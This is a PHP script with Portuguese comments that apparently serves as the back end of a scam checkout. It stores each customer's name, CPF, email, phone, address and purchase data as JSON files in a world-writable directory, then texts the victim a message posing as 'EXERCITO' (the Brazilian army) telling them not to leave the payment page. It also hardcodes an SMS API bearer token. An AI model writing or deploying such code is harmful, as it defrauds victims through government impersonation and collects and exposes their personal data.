<?php
// Receber os dados do checkout
$data = json_decode(file_get_contents('php://input'), true);
// Verificar se os dados foram recebidos corretamente
if ($data && isset($data['customer'])) {
    // Obter os dados necessários
    $customerData = [
        'name' => $data['customer']['name'],
        'cpf' => preg_replace('/[^0-9]/', '', $data['customer']['document']),
        'email' => $data['customer']['email'],
        'phone' => preg_replace('/[^0-9]/', '', $data['customer']['phone']),
        'address' => [
            'street' => $data['address']['street'],
            'number' => $data['address']['number'],
            'district' => $data['address']['district'],
            'city' => $data['address']['city'],
            'state' => $data['address']['state'],
            'zip_code' => $data['address']['zip_code']
        ],
        'purchase' => [
            'transaction_id' => $data['transaction_id'],
            'total_price' => $data['total_price'],
            'status' => $data['status'],
            'created_at' => $data['created_at']
        ]
    ];
    // Criar diretório se não existir
    $directory = 'customers';
    if (!is_dir($directory)) {
        mkdir($directory, 0777, true);
    }
    // Salvar dados em arquivo JSON
    $filename = $directory . '/' . $customerData['cpf'] . '.json';
    file_put_contents($filename, json_encode($customerData, JSON_PRETTY_PRINT));

    // Preparar dados para SMS
    $nome = explode(' ', $customerData['name'])[0];
    $telefoneFormatado = "55" . $customerData['phone'];

    // Mensagem a ser enviada
    $mensagem = "EXERCITO: $nome, IMPORTANTE, aguarde na pagina de pagamento para confirmar o registro. Caso saia da pagina, nao sera confirmado";

    // Enviar o SMS
    enviarSMS($telefoneFormatado, $mensagem);

    echo "Dados salvos com sucesso!";
} else {
    echo "Dados inválidos ou incompletos.";
}
function enviarSMS($numeroDestino, $mensagem) {
    $token = '489d5309-77084165-a76f52ba-df930bcb-bd3e4365';
    $url = 'https://api.apisms.me/v2/send.php';

    $data = [
        'operator' => 'claro',
        'destination_number' => $numeroDestino,
        'message' => $mensagem,
        'tag' => 'Campanha',
        'user_reply' => false
    ];

    $options = [
        'http' => [
            'header'  => "Content-type: application/json\r\nAuthorization: Bearer $token\r\n",
            'method'  => 'POST',
            'content' => json_encode($data),
        ],
    ];

    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    if ($result === FALSE) {
        echo "Falha ao enviar SMS.";
    } else {
        echo "SMS enviado com sucesso!";
    }
}
?>